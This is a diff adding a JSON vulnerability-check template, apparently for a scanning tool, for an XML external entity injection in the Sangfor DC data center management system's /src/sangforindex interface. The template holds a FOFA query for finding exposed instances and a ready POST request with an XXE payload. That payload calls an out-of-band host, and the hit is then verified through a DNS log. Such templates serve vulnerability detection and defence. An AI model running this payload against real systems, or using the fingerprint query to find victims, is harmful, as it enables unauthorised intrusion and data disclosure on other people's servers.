@@ -1,0 +1,40 @@
+{
+  "product": "深信服DC数据中心管理系统",
+  "vul_name": "深信服DC数据中心管理系统 sangforindex外部实体注入",
+  "type": "外部实体注入",
+  "vul_id": [],
+  "level": 3,
+  "vul_desc": "深信服 DC数据中心管理系统 sangforindex 接口存在XML实体注入漏洞，攻击者可以发送特定的请求包造成XML实体注入",
+  "version": "",
+  "note": "",
+  "search": {
+    "FOFA": "\"SANGFOR 数据中心\""
+  },
+  "protocol": "http",
+  "link": "https://www.cnblogs.com/pursue-security/p/17666126.html",
+  "fix": [
+    "建议联系软件厂商进行处理。"
+  ],
+  "model": "dnslog",
+  "logic": "and",
+  "exploit": {
+    "exp": {
+      "method": "post",
+      "follow": false,
+      "path": "/src/sangforindex",
+      "header": {
+        "Content-Type": "text/xml"
+      },
+      "data": "<?xml version=\"1.0\" encoding=\"utf-8\" ?>\n<!DOCTYPE root [\n    <!ENTITY rootas SYSTEM \"http://{{m:rep}}\">\n]>\n<xxx>\n&rootas;\n</xxx>"
+    },
+    "verify": {
+      "path": "",
+      "logic": "and",
+      "check": [
+        {
+          "model": "dnslog"
+        }
+      ]
+    }
+  }
+}
